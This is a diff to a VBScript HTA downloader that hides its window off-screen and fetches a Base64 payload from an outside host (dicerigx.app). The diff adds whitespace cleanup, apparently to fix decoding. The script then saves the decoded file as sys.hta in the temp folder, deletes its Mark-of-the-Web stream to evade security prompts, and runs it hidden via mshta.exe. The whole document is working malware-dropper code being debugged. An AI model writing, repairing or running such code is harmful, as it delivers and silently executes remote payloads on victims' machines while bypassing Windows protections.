@@ -5,24 +5,32 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, st, path, b64, xml, node
+Dim sh, fso, xh, st, path, b64, xml, node, cleanB64
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. Download the Base64 text
+' 1. Fetch the Base64 payload
 xh.Open "GET", "https://dicerigx.app/payload.txt", False
 xh.Send
 
 If xh.Status = 200 Then
     b64 = xh.responseText
+    
+    ' 2. Remove line breaks and spaces (THIS WAS THE BUG)
+    cleanB64 = Replace(b64, vbCr, "")
+    cleanB64 = Replace(cleanB64, vbLf, "")
+    cleanB64 = Replace(cleanB64, vbTab, "")
+    cleanB64 = Replace(cleanB64, " ", "")
+    cleanB64 = Trim(cleanB64)
+    
     path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
     
-    ' 2. Decode the Base64 into the real HTA
+    ' 3. Decode to a local file
     Set xml = CreateObject("MSXML2.DOMDocument")
     Set node = xml.CreateElement("b64")
     node.dataType = "bin.base64"
-    node.text = b64
+    node.text = cleanB64
     
     Set st = CreateObject("ADODB.Stream")
     st.Type = 1
@@ -31,12 +39,11 @@ If xh.Status = 200 Then
     st.SaveToFile path, 2
     st.Close
     
-    ' 3. Strip the Mark of the Web
+    ' 4. Strip MOTW and Run
     On Error Resume Next
     fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
     
-    ' 4. Run the local file hidden
     sh.Run "mshta.exe """ & path & """", 0, False
 End If
 
